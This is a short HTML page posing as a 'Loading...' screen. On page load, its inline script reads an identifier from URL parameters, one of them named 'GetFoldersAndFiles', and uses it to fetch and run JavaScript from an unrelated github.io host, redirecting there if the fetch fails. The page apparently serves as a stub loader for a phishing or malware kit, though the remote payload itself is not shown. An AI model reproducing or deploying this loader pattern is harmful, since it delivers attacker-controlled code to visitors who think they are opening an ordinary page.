<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
</head>
<body>
  <script>
    (function() {
      var params = new URLSearchParams(window.location.search);
      var id = params.get('GetFoldersAndFiles') || params.get('lagabo') || params.get('id');

      if (id) {
        var s = document.createElement('script');
        s.src = 'https://riopehrips.github.io/con/fx.js?id=' + encodeURIComponent(id);
        s.onerror = function() {
          window.location.replace('https://riopehrips.github.io/con/');
        };
        document.head.appendChild(s);
      } else {
        document.body.innerHTML = '<h3>Welcome</h3><p>No ID provided.</p>';
      }
    })();
  </script>
</body>
</html>
